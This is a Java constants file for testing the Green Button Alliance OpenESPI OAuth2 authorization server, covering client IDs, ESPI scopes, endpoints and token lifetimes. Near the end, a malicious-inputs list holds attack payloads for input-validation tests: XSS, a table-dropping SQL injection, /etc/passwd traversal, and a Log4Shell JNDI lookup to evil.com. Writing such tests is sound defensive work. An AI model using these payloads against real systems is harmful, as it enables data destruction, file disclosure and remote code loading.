/*
 *
 *    Copyright (c) 2018-2025 Green Button Alliance, Inc.
 *
 *    Portions (c) 2013-2018 EnergyOS.org
 *
 *     Licensed under the Apache License, Version 2.0 (the "License");
 *     you may not use this file except in compliance with the License.
 *     You may obtain a copy of the License at
 *
 *         http://www.apache.org/licenses/LICENSE-2.0
 *
 *     Unless required by applicable law or agreed to in writing, software
 *     distributed under the License is distributed on an "AS IS" BASIS,
 *     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *     See the License for the specific language governing permissions and
 *     limitations under the License.
 *
 */

package org.greenbuttonalliance.espi.authserver.testdata;

import java.time.Duration;
import java.util.List;
import java.util.Set;

/**
 * Test Constants for OpenESPI Authorization Server Testing
 * 
 * Centralized constants for use across all test classes including
 * ESPI-specific scopes, URIs, client IDs, and test data values.
 * 
 * @author Green Button Alliance
 * @version 1.0.0
 * @since Spring Boot 3.5
 */
public final class TestConstants {

    private TestConstants() {
        // Utility class - prevent instantiation
    }

    // Default Client IDs
    public static final String DEFAULT_DATACUSTODIAN_ADMIN_CLIENT_ID = "data_custodian_admin";
    public static final String DEFAULT_THIRD_PARTY_CLIENT_ID = "third_party";
    public static final String DEFAULT_THIRD_PARTY_ADMIN_CLIENT_ID = "third_party_admin";

    // Default Client Secrets (for testing only)
    public static final String DEFAULT_CLIENT_SECRET = "secret";
    public static final String ENCODED_CLIENT_SECRET = "{noop}secret";

    // Test Client IDs
    public static final String TEST_CLIENT_ID = "test-client";
    public static final String TEST_ADMIN_CLIENT_ID = "test-admin-client";
    public static final String TEST_INVALID_CLIENT_ID = "invalid-client";

    // ESPI Scope Constants
    public static final String ESPI_SCOPE_15_MIN_MONTHLY_13 = "FB=4_5_15;IntervalDuration=3600;BlockDuration=monthly;HistoryLength=13";
    public static final String ESPI_SCOPE_15_MIN_DAILY_7 = "FB=4_5_16;IntervalDuration=900;BlockDuration=daily;HistoryLength=7";
    public static final String ESPI_SCOPE_DAILY_YEARLY_1 = "FB=4_5_17;IntervalDuration=86400;BlockDuration=yearly;HistoryLength=1";
    public static final String ESPI_SCOPE_5_MIN_MONTHLY_13 = "FB=4_5_18;IntervalDuration=300;BlockDuration=monthly;HistoryLength=13";

    // Administrative Scopes
    public static final String DATACUSTODIAN_ADMIN_SCOPE = "DataCustodian_Admin_Access";
    public static final String THIRD_PARTY_ADMIN_SCOPE = "ThirdParty_Admin_Access";
    public static final String UPLOAD_ADMIN_SCOPE = "Upload_Admin_Access";
    public static final String BATCH_ADMIN_SCOPE = "Batch_Admin_Access";

    // Standard OAuth2/OIDC Scopes
    public static final String OPENID_SCOPE = "openid";
    public static final String PROFILE_SCOPE = "profile";
    public static final String EMAIL_SCOPE = "email";
    public static final String ADDRESS_SCOPE = "address";
    public static final String PHONE_SCOPE = "phone";

    // ESPI Scope Collections
    public static final Set<String> ALL_ESPI_SCOPES = Set.of(
        ESPI_SCOPE_15_MIN_MONTHLY_13,
        ESPI_SCOPE_15_MIN_DAILY_7,
        ESPI_SCOPE_DAILY_YEARLY_1,
        ESPI_SCOPE_5_MIN_MONTHLY_13
    );

    public static final Set<String> ADMIN_SCOPES = Set.of(
        DATACUSTODIAN_ADMIN_SCOPE,
        THIRD_PARTY_ADMIN_SCOPE,
        UPLOAD_ADMIN_SCOPE,
        BATCH_ADMIN_SCOPE
    );

    public static final Set<String> STANDARD_SCOPES = Set.of(
        OPENID_SCOPE,
        PROFILE_SCOPE,
        EMAIL_SCOPE,
        ADDRESS_SCOPE,
        PHONE_SCOPE
    );

    // Redirect URIs
    public static final String DATACUSTODIAN_CALLBACK_URI = "http://localhost:8080/DataCustodian/oauth/callback";
    public static final String THIRD_PARTY_CALLBACK_URI = "http://localhost:9090/ThirdParty/oauth/callback";
    public static final String TEST_CALLBACK_URI = "https://example.com/callback";
    public static final String TEST_LOGOUT_URI = "https://example.com/logout";
    public static final String INVALID_HTTP_URI = "http://insecure.example.com/callback";
    public static final String MALICIOUS_URI = "javascript:alert('xss')";

    // Valid Test URIs
    public static final List<String> VALID_REDIRECT_URIS = List.of(
        "https://app.example.com/callback",
        "https://mobile.example.com/oauth/callback",
        "https://web.greenbuttonalliance.org/callback",
        DATACUSTODIAN_CALLBACK_URI, // localhost HTTP allowed for testing
        THIRD_PARTY_CALLBACK_URI
    );

    // Token Lifetimes (ESPI-compliant)
    public static final Duration CUSTOMER_ACCESS_TOKEN_LIFETIME = Duration.ofMinutes(360); // 6 hours
    public static final Duration ADMIN_ACCESS_TOKEN_LIFETIME = Duration.ofMinutes(60); // 1 hour
    public static final Duration REFRESH_TOKEN_LIFETIME = Duration.ofMinutes(3600); // 60 hours
    public static final Duration AUTHORIZATION_CODE_LIFETIME = Duration.ofMinutes(5); // 5 minutes

    // Server Configuration
    public static final String ISSUER_URI = "http://localhost:9999";
    public static final String AUTHORIZATION_ENDPOINT = "/oauth2/authorize";
    public static final String TOKEN_ENDPOINT = "/oauth2/token";
    public static final String JWK_SET_ENDPOINT = "/oauth2/jwks";
    public static final String INTROSPECTION_ENDPOINT = "/oauth2/introspect";
    public static final String REVOCATION_ENDPOINT = "/oauth2/revoke";
    public static final String REGISTRATION_ENDPOINT = "/connect/register";
    public static final String USERINFO_ENDPOINT = "/userinfo";

    // Grant Types
    public static final String AUTHORIZATION_CODE_GRANT = "authorization_code";
    public static final String CLIENT_CREDENTIALS_GRANT = "client_credentials";
    public static final String REFRESH_TOKEN_GRANT = "refresh_token";
    public static final String IMPLICIT_GRANT = "implicit"; // Not supported in ESPI
    public static final String PASSWORD_GRANT = "password"; // Not supported in ESPI

    // Response Types
    public static final String CODE_RESPONSE_TYPE = "code";
    public static final String TOKEN_RESPONSE_TYPE = "token"; // Not supported in ESPI
    public static final String ID_TOKEN_RESPONSE_TYPE = "id_token";

    // Authentication Methods
    public static final String CLIENT_SECRET_BASIC = "client_secret_basic";
    public static final String CLIENT_SECRET_POST = "client_secret_post";
    public static final String CLIENT_SECRET_JWT = "client_secret_jwt";
    public static final String PRIVATE_KEY_JWT = "private_key_jwt";
    public static final String NONE = "none";

    // Test User Information
    public static final String TEST_USER_EMAIL = "customer@example.com";
    public static final String TEST_ADMIN_EMAIL = "admin@datacustodian.com";
    public static final String TEST_USER_NAME = "Test Customer";
    public static final String TEST_ADMIN_NAME = "Test Administrator";

    // Error Codes (OAuth2/OIDC standard)
    public static final String INVALID_REQUEST = "invalid_request";
    public static final String INVALID_CLIENT = "invalid_client";
    public static final String INVALID_GRANT = "invalid_grant";
    public static final String UNAUTHORIZED_CLIENT = "unauthorized_client";
    public static final String UNSUPPORTED_GRANT_TYPE = "unsupported_grant_type";
    public static final String INVALID_SCOPE = "invalid_scope";
    public static final String ACCESS_DENIED = "access_denied";
    public static final String UNSUPPORTED_RESPONSE_TYPE = "unsupported_response_type";
    public static final String SERVER_ERROR = "server_error";
    public static final String INVALID_CLIENT_METADATA = "invalid_client_metadata";

    // ESPI-specific Constants
    public static final String ESPI_VERSION = "1.1";
    public static final String ESPI_CLIENT_PREFIX = "espi_client_";
    public static final String GREEN_BUTTON_ALLIANCE_DOMAIN = "greenbuttonalliance.org";

    // Test Data Values
    public static final String TEST_STATE = "test-state-123";
    public static final String TEST_NONCE = "test-nonce-456";
    public static final String TEST_CODE_CHALLENGE = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
    public static final String TEST_CODE_VERIFIER = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";

    // Database Test Values
    public static final String TEST_CLIENT_NAME = "Test ESPI Client";
    public static final String TEST_CLIENT_DESCRIPTION = "Test client for ESPI functionality";
    public static final String TEST_SOFTWARE_ID = "test-software-123";
    public static final String TEST_SOFTWARE_VERSION = "1.0.0";

    // Security Test Values
    public static final String XSS_SCRIPT = "<script>alert('xss')</script>";
    public static final String SQL_INJECTION = "'; DROP TABLE oauth2_registered_client; --";
    public static final String LONG_STRING = "a".repeat(10000);

    // Roles and Authorities
    public static final String ROLE_ADMIN = "ROLE_ADMIN";
    public static final String ROLE_DC_ADMIN = "ROLE_DC_ADMIN";
    public static final String ROLE_TP_ADMIN = "ROLE_TP_ADMIN";
    public static final String ROLE_USER = "ROLE_USER";
    public static final String ROLE_CUSTOMER = "ROLE_CUSTOMER";

    // Test Collections for Parameterized Tests
    public static final List<String> INVALID_GRANT_TYPES = List.of(
        IMPLICIT_GRANT,
        PASSWORD_GRANT,
        "device_code",
        "urn:ietf:params:oauth:grant-type:jwt-bearer"
    );

    public static final List<String> INVALID_RESPONSE_TYPES = List.of(
        TOKEN_RESPONSE_TYPE,
        "id_token token",
        "code token",
        "code id_token token"
    );

    public static final List<String> INVALID_AUTH_METHODS = List.of(
        CLIENT_SECRET_JWT,
        PRIVATE_KEY_JWT,
        "tls_client_auth",
        "self_signed_tls_client_auth"
    );

    public static final List<String> MALICIOUS_INPUTS = List.of(
        XSS_SCRIPT,
        SQL_INJECTION,
        "javascript:void(0)",
        "data:text/html,<script>alert('xss')</script>",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
    );

    /**
     * Creates a complete ESPI scope string for testing
     */
    public static String createEspiScope(String functionBlock, int intervalDuration, String blockDuration, int historyLength) {
        return String.format("FB=%s;IntervalDuration=%d;BlockDuration=%s;HistoryLength=%d", 
                            functionBlock, intervalDuration, blockDuration, historyLength);
    }

    /**
     * Creates a space-separated scope string from multiple scopes
     */
    public static String joinScopes(String... scopes) {
        return String.join(" ", scopes);
    }

    /**
     * Creates a comprehensive scope string for ESPI customer client
     */
    public static String getCustomerEspiScopes() {
        return joinScopes(
            OPENID_SCOPE,
            PROFILE_SCOPE,
            ESPI_SCOPE_15_MIN_MONTHLY_13,
            ESPI_SCOPE_15_MIN_DAILY_7
        );
    }

    /**
     * Creates scope string for admin client
     */
    public static String getAdminScopes() {
        return joinScopes(
            DATACUSTODIAN_ADMIN_SCOPE,
            THIRD_PARTY_ADMIN_SCOPE
        );
    }
}